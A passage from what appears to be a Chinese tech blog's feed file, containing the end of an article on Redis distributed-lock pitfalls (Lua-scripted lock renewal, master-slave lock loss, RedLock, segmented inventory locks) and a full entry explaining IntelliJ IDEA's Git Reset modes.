k2：续约耗时key, arg1:requestId，arg2：超时时间  </span><br><span class="line">     \*/  </span><br><span class="line">    private static final String LOCK\_SCRIPT = &quot;if redis.call(&#x27;exists&#x27;, KEYS\[2\]) == 1 then ARGV\[2\] = math.floor(redis.call(&#x27;get&#x27;, KEYS\[2\]) + 10) end &quot; +  </span><br><span class="line">            &quot;if redis.call(&#x27;exists&#x27;, KEYS\[1\]) == 0 then &quot; +  </span><br><span class="line">               &quot;local t = redis.call(&#x27;set&#x27;, KEYS\[1\], ARGV\[1\], &#x27;EX&#x27;, ARGV\[2\]) &quot; +  </span><br><span class="line">               &quot;for k, v in pairs(t) do &quot; +  </span><br><span class="line">                 &quot;if v == &#x27;OK&#x27; then return tonumber(ARGV\[2\]) end &quot; +  </span><br><span class="line">               &quot;end &quot; +  </span><br><span class="line">            &quot;return 0 end&quot;;  </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 释放锁lua脚本, k1：获锁key, k2：续约耗时key, arg1:requestId，arg2：业务耗时 arg3: 业务开始设置的timeout  </span><br><span class="line">     \*/  </span><br><span class="line">    private static final String UNLOCK\_SCRIPT = &quot;if redis.call(&#x27;get&#x27;, KEYS\[1\]) == ARGV\[1\] then &quot; +  </span><br><span class="line">            &quot;local ctime = tonumber(ARGV\[2\]) &quot; +  </span><br><span class="line">            &quot;local biz\_timeout = tonumber(ARGV\[3\]) &quot; +  </span><br><span class="line">            &quot;if ctime &gt; 0 then  &quot; +  </span><br><span class="line">               &quot;if redis.call(&#x27;exists&#x27;, KEYS\[2\]) == 1 then &quot; +  </span><br><span class="line">                   &quot;local avg\_time = redis.call(&#x27;get&#x27;, KEYS\[2\]) &quot; +  </span><br><span class="line">                   &quot;avg\_time = (tonumber(avg\_time) \* 8 + ctime \* 2)/10 &quot; +  </span><br><span class="line">                   &quot;if avg\_time &gt;= biz\_timeout - 5 then redis.call(&#x27;set&#x27;, KEYS\[2\], avg\_time, &#x27;EX&#x27;, 24\*60\*60) &quot; +  </span><br><span class="line">                   &quot;else redis.call(&#x27;del&#x27;, KEYS\[2\]) end &quot; +  </span><br><span class="line">               &quot;elseif ctime &gt; biz\_timeout -5 then redis.call(&#x27;set&#x27;, KEYS\[2\], ARGV\[2\], &#x27;EX&#x27;, 24\*60\*60) end &quot; +  </span><br><span class="line">            &quot;end &quot; +  </span><br><span class="line">            &quot;return redis.call(&#x27;del&#x27;, KEYS\[1\]) &quot; +  </span><br><span class="line">            &quot;else return 0 end&quot;;  </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 续约lua脚本  </span><br><span class="line">     \*/  </span><br><span class="line">    private static final String RENEW\_SCRIPT = &quot;if redis.call(&#x27;get&#x27;, KEYS\[1\]) == ARGV\[1\] then return redis.call(&#x27;expire&#x27;, KEYS\[1\], ARGV\[2\]) else return 0 end&quot;;  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    private final StringRedisTemplate redisTemplate;  </span><br><span class="line">   </span><br><span class="line">    public RedisDistributionLockPlus(StringRedisTemplate redisTemplate) &#123;  </span><br><span class="line">        this.redisTemplate = redisTemplate;  </span><br><span class="line">        ScheduleTask task = new ScheduleTask(this, lockContentMap);  </span><br><span class="line">        // 启动定时任务  </span><br><span class="line">        ScheduleExecutor.schedule(task, 1, 1, TimeUnit.SECONDS);  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 加锁  </span><br><span class="line">     \* 取到锁加锁，取不到锁一直等待知道获得锁  </span><br><span class="line">     \*  </span><br><span class="line">     \* @param lockKey  </span><br><span class="line">     \* @param requestId 全局唯一  </span><br><span class="line">     \* @param expire   锁过期时间, 单位秒  </span><br><span class="line">     \* @return  </span><br><span class="line">     \*/  </span><br><span class="line">    public boolean lock(String lockKey, String requestId, long expire) &#123;  </span><br><span class="line">        log.info(&quot;开始执行加锁, lockKey =&#123;&#125;, requestId=&#123;&#125;&quot;, lockKey, requestId);  </span><br><span class="line">        for (; ; ) &#123;  </span><br><span class="line">            // 判断是否已经有线程持有锁，减少redis的压力  </span><br><span class="line">            LockContent lockContentOld = lockContentMap.get(lockKey);  </span><br><span class="line">            boolean unLocked = null == lockContentOld;  </span><br><span class="line">            // 如果没有被锁，就获取锁  </span><br><span class="line">            if (unLocked) &#123;  </span><br><span class="line">                long startTime = System.currentTimeMillis();  </span><br><span class="line">                // 计算超时时间  </span><br><span class="line">                long bizExpire = expire == 0L ? DEFAULT\_LOCK\_TIMEOUT : expire;  </span><br><span class="line">                String lockKeyRenew = lockKey + &quot;\_renew&quot;;  </span><br><span class="line">   </span><br><span class="line">                RedisScript&lt;Long&gt; script = RedisScript.of(LOCK\_SCRIPT, Long.class);  </span><br><span class="line">                List&lt;String&gt; keys = new ArrayList&lt;&gt;();  </span><br><span class="line">                keys.add(lockKey);  </span><br><span class="line">                keys.add(lockKeyRenew);  </span><br><span class="line">                Long lockExpire = redisTemplate.execute(script, keys, requestId, Long.toString(bizExpire));  </span><br><span class="line">                if (null != lockExpire &amp;&amp; lockExpire &gt; 0) &#123;  </span><br><span class="line">                    // 将锁放入map  </span><br><span class="line">                    LockContent lockContent = new LockContent();  </span><br><span class="line">                    lockContent.setStartTime(startTime);  </span><br><span class="line">                    lockContent.setLockExpire(lockExpire);  </span><br><span class="line">                    lockContent.setExpireTime(startTime + lockExpire \* 1000);  </span><br><span class="line">                    lockContent.setRequestId(requestId);  </span><br><span class="line">                    lockContent.setThread(Thread.currentThread());  </span><br><span class="line">                    lockContent.setBizExpire(bizExpire);  </span><br><span class="line">                    lockContent.setLockCount(1);  </span><br><span class="line">                    lockContentMap.put(lockKey, lockContent);  </span><br><span class="line">                    log.info(&quot;加锁成功, lockKey =&#123;&#125;, requestId=&#123;&#125;&quot;, lockKey, requestId);  </span><br><span class="line">                    return true;  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">            // 重复获取锁，在线程池中由于线程复用，线程相等并不能确定是该线程的锁  </span><br><span class="line">            if (Thread.currentThread() == lockContentOld.getThread()  </span><br><span class="line">                      &amp;&amp; requestId.equals(lockContentOld.getRequestId()))&#123;  </span><br><span class="line">                // 计数 +1  </span><br><span class="line">                lockContentOld.setLockCount(lockContentOld.getLockCount()+1);  </span><br><span class="line">                return true;  </span><br><span class="line">            &#125;  </span><br><span class="line">   </span><br><span class="line">            // 如果被锁或获取锁失败，则等待100毫秒  </span><br><span class="line">            try &#123;  </span><br><span class="line">                TimeUnit.MILLISECONDS.sleep(100);  </span><br><span class="line">            &#125; catch (InterruptedException e) &#123;  </span><br><span class="line">                // 这里用lombok 有问题  </span><br><span class="line">                log.error(&quot;获取redis 锁失败, lockKey =&#123;&#125;, requestId=&#123;&#125;&quot;, lockKey, requestId, e);  </span><br><span class="line">                return false;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 解锁  </span><br><span class="line">     \*  </span><br><span class="line">     \* @param lockKey  </span><br><span class="line">     \* @param lockValue  </span><br><span class="line">     \*/  </span><br><span class="line">    public boolean unlock(String lockKey, String lockValue) &#123;  </span><br><span class="line">        String lockKeyRenew = lockKey + &quot;\_renew&quot;;  </span><br><span class="line">        LockContent lockContent = lockContentMap.get(lockKey);  </span><br><span class="line">   </span><br><span class="line">        long consumeTime;  </span><br><span class="line">        if (null == lockContent) &#123;  </span><br><span class="line">            consumeTime = 0L;  </span><br><span class="line">        &#125; else if (lockValue.equals(lockContent.getRequestId())) &#123;  </span><br><span class="line">            int lockCount = lockContent.getLockCount();  </span><br><span class="line">            // 每次释放锁， 计数 -1，减到0时删除redis上的key  </span><br><span class="line">            if (--lockCount &gt; 0) &#123;  </span><br><span class="line">                lockContent.setLockCount(lockCount);  </span><br><span class="line">                return false;  </span><br><span class="line">            &#125;  </span><br><span class="line">            consumeTime = (System.currentTimeMillis() - lockContent.getStartTime()) / 1000;  </span><br><span class="line">        &#125; else &#123;  </span><br><span class="line">            log.info(&quot;释放锁失败，不是自己的锁。&quot;);  </span><br><span class="line">            return false;  </span><br><span class="line">        &#125;  </span><br><span class="line">   </span><br><span class="line">        // 删除已完成key，先删除本地缓存，减少redis压力, 分布式锁，只有一个，所以这里不加锁  </span><br><span class="line">        lockContentMap.remove(lockKey);  </span><br><span class="line">   </span><br><span class="line">        RedisScript&lt;Long&gt; script = RedisScript.of(UNLOCK\_SCRIPT, Long.class);  </span><br><span class="line">        List&lt;String&gt; keys = new ArrayList&lt;&gt;();  </span><br><span class="line">        keys.add(lockKey);  </span><br><span class="line">        keys.add(lockKeyRenew);  </span><br><span class="line">   </span><br><span class="line">        Long result = redisTemplate.execute(script, keys, lockValue, Long.toString(consumeTime),  </span><br><span class="line">                Long.toString(lockContent.getBizExpire()));  </span><br><span class="line">        return EXEC\_SUCCESS.equals(result);  </span><br><span class="line">   </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    /\*\*  </span><br><span class="line">     \* 续约  </span><br><span class="line">     \*  </span><br><span class="line">     \* @param lockKey  </span><br><span class="line">     \* @param lockContent  </span><br><span class="line">     \* @return true:续约成功，false:续约失败（1、续约期间执行完成，锁被释放 2、不是自己的锁，3、续约期间锁过期了（未解决））  </span><br><span class="line">     \*/  </span><br><span class="line">    public boolean renew(String lockKey, LockContent lockContent) &#123;  </span><br><span class="line">   </span><br><span class="line">        // 检测执行业务线程的状态  </span><br><span class="line">        Thread.State state = lockContent.getThread().getState();  </span><br><span class="line">        if (Thread.State.TERMINATED == state) &#123;  </span><br><span class="line">            log.info(&quot;执行业务的线程已终止,不再续约 lockKey =&#123;&#125;, lockContent=&#123;&#125;&quot;, lockKey, lockContent);  </span><br><span class="line">            return false;  </span><br><span class="line">        &#125;  </span><br><span class="line">   </span><br><span class="line">        String requestId = lockContent.getRequestId();  </span><br><span class="line">        long timeOut = (lockContent.getExpireTime() - lockContent.getStartTime()) / 1000;  </span><br><span class="line">   </span><br><span class="line">        RedisScript&lt;Long&gt; script = RedisScript.of(RENEW\_SCRIPT, Long.class);  </span><br><span class="line">        List&lt;String&gt; keys = new ArrayList&lt;&gt;();  </span><br><span class="line">        keys.add(lockKey);  </span><br><span class="line">   </span><br><span class="line">        Long result = redisTemplate.execute(script, keys, requestId, Long.toString(timeOut));  </span><br><span class="line">        log.info(&quot;续约结果，True成功，False失败 lockKey =&#123;&#125;, result=&#123;&#125;&quot;, lockKey, EXEC\_SUCCESS.equals(result));  </span><br><span class="line">        return EXEC\_SUCCESS.equals(result);  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">    static class ScheduleExecutor &#123;  </span><br><span class="line">   </span><br><span class="line">        public static void schedule(ScheduleTask task, long initialDelay, long period, TimeUnit unit) &#123;  </span><br><span class="line">            long delay = unit.toMillis(initialDelay);  </span><br><span class="line">            long period\_ = unit.toMillis(period);  </span><br><span class="line">            // 定时执行  </span><br><span class="line">            new Timer(&quot;Lock-Renew-Task&quot;).schedule(task, delay, period\_);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">   </span><br><span class="line">    static class ScheduleTask extends TimerTask &#123;  </span><br><span class="line">   </span><br><span class="line">        private final RedisDistributionLockPlus redisDistributionLock;  </span><br><span class="line">        private final Map&lt;String, LockContent&gt; lockContentMap;  </span><br><span class="line">   </span><br><span class="line">        public ScheduleTask(RedisDistributionLockPlus redisDistributionLock, Map&lt;String, LockContent&gt; lockContentMap) &#123;  </span><br><span class="line">            this.redisDistributionLock = redisDistributionLock;  </span><br><span class="line">            this.lockContentMap = lockContentMap;  </span><br><span class="line">        &#125;  </span><br><span class="line">   </span><br><span class="line">        @Override  </span><br><span class="line">        public void run() &#123;  </span><br><span class="line">            if (lockContentMap.isEmpty()) &#123;  </span><br><span class="line">                return;  </span><br><span class="line">            &#125;  </span><br><span class="line">            Set&lt;Map.Entry&lt;String, LockContent&gt;&gt; entries = lockContentMap.entrySet();  </span><br><span class="line">            for (Map.Entry&lt;String, LockContent&gt; entry : entries) &#123;  </span><br><span class="line">                String lockKey = entry.getKey();  </span><br><span class="line">                LockContent lockContent = entry.getValue();  </span><br><span class="line">                long expireTime = lockContent.getExpireTime();  </span><br><span class="line">                // 减少线程池中任务数量  </span><br><span class="line">                if ((expireTime - System.currentTimeMillis())/ 1000 &lt; TIME\_SECONDS\_FIVE) &#123;  </span><br><span class="line">                    //线程池异步续约  </span><br><span class="line">                    ThreadPool.submit(() -&gt; &#123;  </span><br><span class="line">                        boolean renew = redisDistributionLock.renew(lockKey, lockContent);  </span><br><span class="line">                        if (renew) &#123;  </span><br><span class="line">                            long expireTimeNew = lockContent.getStartTime() + (expireTime - lockContent.getStartTime()) \* 2 - TIME\_SECONDS\_FIVE \* 1000;  </span><br><span class="line">                            lockContent.setExpireTime(expireTimeNew);  </span><br><span class="line">                        &#125; else &#123;  </span><br><span class="line">                            // 续约失败，说明已经执行完 OR redis 出现问题  </span><br><span class="line">                            lockContentMap.remove(lockKey);  </span><br><span class="line">                        &#125;  </span><br><span class="line">                    &#125;);  </span><br><span class="line">                &#125;  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过源码，可以发现：</p><p>Redission <code>加锁</code>、<code>解锁</code>、<code>续约</code>都是客户端把一些复杂的业务逻辑，通过封装在<code>Lua</code>脚本中发送给<code>redis</code>，保证这段复杂业务逻辑执行的<code>原子性</code></p><p>有关  <strong>锁过期</strong> 的系统化、体系化的 介绍， 请参见的 专题文章（建议大家看10遍）：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247503521&idx=1&sn=e2f71881eb3abd52d484213089262ebc&scene=21#wechat_redirect"><strong>史上最全： Redis锁如何续期 ？Redis锁超时，任务没完怎么办？</strong></a></p><h2 id="之四：锁失效-的深坑"><a href="#之四：锁失效-的深坑" class="headerlink" title="之四：锁失效 的深坑"></a>之四：锁失效 的深坑</h2><p>redis高可用最常见的方案就是主从复制（master-slave），这种模式也给redis分布式锁挖了一坑。</p><p>redis cluster集群环境下，假如现在A客户端想要加锁，它会根据路由规则选择一台master节点写入key mylock，在加锁成功后，master节点会把key异步复制给对应的slave节点。</p><p>在Redis主从架构中，写入的，都是 master Redis实例，master 主实例会向 slave 从实例同步key。</p><p>一个业务线程 通过向主Redis实例中写入 key-value 来实现加分布式锁，加锁后开始执行业务代码。</p><p>一般情况下：如果主master Redis实例挂掉了，会选举出一个从Redis实例成为主的。这是redis 集群的故障转移机制。</p><p>但是，如果刚刚加锁的key还没有来得及同步到slave Redis中，新选出的主Redis实例中就没有这个key，这个时候业务线程B就能加锁来获取分布式锁，导致锁失效了。</p><p>线程B 加锁成功，也执行业务代码了。</p><p>B客户端在新的master节点上加锁成功，而A客户端也以为自己还是成功加了锁的。</p><p>此时就会导致同一时间内多个客户端对一个分布式锁完成了加锁，导致各种脏数据的产生。</p><p>而这个时候A还没有执行结束，所以就会出现并发安全问题，这就是Redis主从架构下的分布式锁失效问题</p><p>本质上，Redis 分布式锁的高可用，有两个层面的解决方案：</p><p>Redis 分布式锁的Server端高可用方案, 就是通过配置， 保证Server 尽量可能少的数据丢失。</p><p>在redis的配置文件中有两个参数我们可以设置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">min-slaves-to-write 1  </span><br><span class="line">min-slaves-max-lag 10  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>min-slaves-to-write默认情况下是0，min-slaves-max-lag默认情况下是10。</p><p>Redis 分布式锁的Server端高可用方案, 就是使用红锁。</p><p>在 Java 中，可以使用 Redisson 框架来实现 RedLock。RedissonRedLock 实际上是基于 RedissonMultiLock 实现的，从继承关系可以看出这一点。</p><p>Redisson 提供了 RedissonMultiLock 类，它可以同时管理多个锁，并保证操作的原子性。</p><p>以下是 Redisson 中 RedLock 的简单使用示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">RedissonClient redisson = // 初始化 Redisson 客户端  </span><br><span class="line">RLock lock1 = redisson.getLock(&quot;lock1&quot;);  </span><br><span class="line">RLock lock2 = redisson.getLock(&quot;lock2&quot;);  </span><br><span class="line">RLock lock3 = redisson.getLock(&quot;lock3&quot;);  </span><br><span class="line">  </span><br><span class="line">RedissonMultiLock multiLock = new RedissonMultiLock(lock1, lock2, lock3);  </span><br><span class="line">try &#123;  </span><br><span class="line">   if (multiLock.tryLock()) &#123;  </span><br><span class="line">       // 成功获取锁，执行业务逻辑  </span><br><span class="line">   &#125; else &#123;  </span><br><span class="line">       // 获取锁失败  </span><br><span class="line">   &#125;  </span><br><span class="line">&#125; finally &#123;  </span><br><span class="line">   multiLock.unlock(); // 释放锁  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过以上机制，RedLock 在分布式环境下提供了一种较为可靠的锁方案，能够应对部分节点故障，并保持锁服务的可用性和安全性。</p><p>RedLock 具备以下主要特性：</p><ul><li><p>互斥性：在任何时间，只有一个客户端可以获得锁，确保了资源的互斥访问。</p></li><li><p>避免死锁：通过为锁设置一个较短的过期时间，即使客户端在获得锁后由于网络故障等原因未能按时释放锁，锁也会因为过期而自动释放，避免了死锁的发生。</p></li><li><p>容错性：即使一部分 Redis 节点宕机，只要大多数节点（即过半数以上的节点）仍在线，RedLock 算法就能继续提供服务，并确保锁的正确性。</p></li></ul><p>有关  <strong>锁失效</strong> 的系统化、体系化的 介绍， 请参见的 专题文章（建议大家看10遍）：</p><p><a href="https://mp.weixin.qq.com/s?__biz=MzkxNzIyMTM1NQ==&mid=2247503611&idx=1&sn=3cf05137d843f87757f3b7a3c76dbd7b&scene=21#wechat_redirect"><strong>史上最全：Redis分布式 锁失效了，怎么办？</strong></a></p><h2 id="之五：锁分段-的深坑"><a href="#之五：锁分段-的深坑" class="headerlink" title="之五：锁分段 的深坑"></a>之五：锁分段 的深坑</h2><p>此外，为了减小锁的粒度，比较常见的做法是将大锁：分段。</p><p>java中`ConcurrentHashMap ，就是将数据分为16段，每一段都有单独的锁，并且处于不同锁段的数据互不干扰，以此来提升锁的性能。</p><p>由于秒杀场景的分布式锁，实际上是为了防止超卖， 和库存是强相关的。</p><p>所以，可以结合库存，把秒杀的分布式锁 提升性能。</p><p>第一步： 把redis 的分段方式进行演进，就是将库存分段分为100段，每一段都有单独的锁，并且处于不同锁段的数据互不干扰，以此来提升锁的性能。。</p><p>第二步：使用hash取模法，把用户路由到某一个分段，如果分段里边的库存耗光了，就去访问剩余的总库存。</p><p>具体来说，现在的库存中有2000个商品，用户可以秒杀。为了防止出现超卖的情况，通常情况下，可以对库存加锁。如果有1W的用户竞争同一把锁，显然系统吞吐量会非常低。</p><p>为了提升系统性能，我们可以将库存分段，比如：分为100段，这样每段就有20个商品可以参与秒杀。</p><p>在秒杀的过程中，先把用户id获取hash值，然后除以100取模。</p><p>模为1的用户访问第1段库存，模为2的用户访问第2段库存，模为3的用户访问第3段库存，后面以此类推，到最后模为100的用户访问第100段库存。</p><p><img src="/./2025/02/24/redis-%E9%94%81%E7%9A%845%E4%B8%AA%E5%A4%A7%E5%9D%91%EF%BC%8C%E5%A6%82%E4%BD%95%E8%A7%84%E9%81%BF%EF%BC%9F/5.png"></p><p>上面的这个 方案还有一个不足：</p><ul><li>可能 其他slot槽位 还有 库存， 但是 用户请求 路由到 对应的分片槽位 没有库存， 导致 扣减库存失败</li></ul><h3 id="解决办法是：在使用hash取模基础上，可以使用动态库存迁移，减少库存消耗不均和无效重试"><a href="#解决办法是：在使用hash取模基础上，可以使用动态库存迁移，减少库存消耗不均和无效重试" class="headerlink" title="解决办法是：在使用hash取模基础上，可以使用动态库存迁移，减少库存消耗不均和无效重试"></a>解决办法是：在使用hash取模基础上，可以使用动态库存迁移，减少库存消耗不均和无效重试</h3><p>所以，可以结合库存，把秒杀的分布式锁进行改进。</p><p>第一步： 把redis 的分段方式进行演进，额外增加一个总库存分段锁，用于分配存储剩余的总库存。采用多批次少量分配的思路，通过定时任务，从总库存向分段库存中迁移库存。</p><p>第二步：使用hash取模法，把用户路由到某一个分段，如果分段里边的库存耗光了，就去访问剩余的总库存。</p><h3 id="库存动态迁移"><a href="#库存动态迁移" class="headerlink" title="库存动态迁移"></a>库存动态迁移</h3><p>为了防止分段多库存耗光，大家都去抢占总库存锁。</p><p>采用多批次少量分配的思路，通过定时任务，从总库存向分段库存中迁移库存。</p><p>至此， hash取模法的分段锁设计方案，已经完美实现。</p><p>并且社群中，已经有小伙伴在生产上完成落地。 以上方案，也是在给他一对一改简历的时候，分享给的。</p><p>当然，如果大家简历挖掘不出来亮点，也可以找挖掘， 保证简历金光闪闪、改天换地。</p><p>如此一来，在多线程环境中，可以大大的减少锁的冲突。</p><p>以前多个线程只能同时竞争1把锁，尤其在秒杀的场景中，竞争太激烈了，简直可以用惨绝人寰来形容，其后果是导致绝大数线程在锁等待。</p><p>redis 锁，是一个非常常见的高并发面试题，很多面试官也非常熟悉，上来就让面试者讲讲 redis 锁。</p><p>珍藏此文， 帮大家 吊打面试官。</p>]]></content>
      
      
      <categories>
          
          <category> 架构设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>IDEA中Git Reset选项说明</title>
      
      <link href="/2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/"/>
      <url>/2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/</url>
      
        <content type="html"><![CDATA[<h4 id="1-目标"><a href="#1-目标" class="headerlink" title="1 . 目标"></a>1 . 目标</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`演示下图的git reset 各选项的效果。`</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/1.png"></p><hr><h4 id="2-Git-Reset操作说明"><a href="#2-Git-Reset操作说明" class="headerlink" title="2. Git Reset操作说明"></a>2. Git Reset操作说明</h4><p>图中说明：<br>This will reset the current branch head to the selected commit, and update the working tree and the index accoding to the seleted mode.<br>意思是：<br>该操作会重置当前分支指针到所选择的提交点，并且更新记录点和根据所选选项更新index状态。</p><p>这句话意味着该项操作会影响两件事：提交的记录 和 当前工作区中的文件状态。</p><hr><h4 id="3-环境说明"><a href="#3-环境说明" class="headerlink" title="3. 环境说明"></a>3. 环境说明</h4><p>为了简化演示，本次使用master分支。master分支初始状态为下图所示：</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/2.png"></p><p>本篇各个选项的效果演示均在“回退到版本1”这个需求下进行。</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/3.png"></p><p>弹出选项框</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/4.png"></p><hr><h4 id="4-各选项效果说明"><a href="#4-各选项效果说明" class="headerlink" title="4. 各选项效果说明"></a>4. 各选项效果说明</h4><p><strong>Soft选项：</strong>在选择的回退点之后的所有更改将会保留并被git追踪下来。这就意味着可以在 Version Control 的 Local Changes 面板中查看到它们。</p><p>创建新文件demo.txt 并index。使得demo.txt文件能够被git追踪版本。</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/5.png"><br><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/6.png"></p><p>此时我们是在版本2的工作区基础上进行创建的demo.txt，此时我们想要回退到版本1，并使用Soft模式回退。回退的结果如下：</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/7.png"></p><p><strong>Mixed模式：</strong>在选择的回退点之后的所有更改将会保留但不会被git追踪下来。</p><p>创建新文件demo.txt 并index。使得demo.txt文件能够被git追踪版本。</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/8.png"></p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/9.png"></p><p>此时我们是在版本2的工作区基础上进行创建的demo.txt，此时我们想要回退到版本1，并使用Mixed模式回退。效果如下：</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/10.png"></p><p><strong>Hard模式：</strong>在选择的回退点之后的所有更改都会被丢弃。（包括被追踪的和已提交的文件）</p><p>在版本2基础上新增文字，形成未提交的版本3.</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/11.png"></p><p>回退到版本1，以Hard模式。</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/12.png"></p><p><strong>Keep模式：</strong>在选择的回退点之后的所有已提交的更改会被丢弃。但本地修改的会被完整地保存下来。</p><p>在版本2基础上新增文字，形成未提交的版本3</p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/13.png"></p><p>选择了Keep模式进行回退到版本1的效果如下： </p><p><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/14.png"></p><p>说明：上图出现了Git Reset Problem对话框是因为Keep模式会保留工作区修改的内容，所以在回退到指定的提交点后，Idea接下来要处理就是这些在工作区修改的内容，所以询问用户是否有必要保留这些内容。如果没必要保留，就完全可以Hard reset；如果有必要，通常情况下下一步就会需要解决冲突问题。</p><p>Hard Reset效果如 4.3 所示，点击<a href="https://so.csdn.net/so/search?q=Smart&spm=1001.2101.3001.7020">Smart</a> Reset后效果如下：<br><img src="/./2024/08/28/IDEA%E4%B8%ADGit-Reset%E9%80%89%E9%A1%B9%E8%AF%B4%E6%98%8E/15.png"></p><p>没错，这里的stash 和 unstash 都是自动完成的。</p><p>说明：用户也可以自己手动 stash 和 unstash操作，类似压栈和弹栈操作。这一机制在“暂时不想提交现已修改的，但现在必须马上在未修改之前的版本上着手开发另一套事情”的尴尬场景下，可以帮助我们有一个解决方法。这一概念像CPU被中断后如何保存中断现场，在处理完其他任务后，能够恢复当时现场。这里也是：当前开发版本被中断后如何保存当前未提交内容，在开发完成其他事情后，再恢复到这些内容。</p><hr><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h4><p>Soft：在选定提交点之后所做的所有更改都将被暂存（这意味着可以到 Version Control 窗口（Alt+9）的Local Changes 选项卡，以便您可以查看它们，并在必要时稍后提交）。</p><p>Mixed：在所选提交之后所做的更改将被保留，但不会暂存以进行提交。</p><p>Hard：在所选提交之后所做的所有更改都将被丢弃（已暂存的和已提交的）。</p><p>Keep：在选定的提交之后所做的提交更改将被丢弃，但本地更改将保持不变。</p>]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      
        <title>分库分表后，如何设计深度翻页？</title>
      
      <link href="/2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/"/>
      <url>/2024/08/25/%E5%88%86%E5%BA%93%E5%88%86%E8%A1%A8%E5%90%8E%EF%BC%8C%E5%A6%82%E4%BD%95%E8%AE%BE%E8%AE%A1%E6%B7%B1%E5%BA%A6%E7%BF%BB%E9%A1%B5%EF%BC%9F/</url>
      
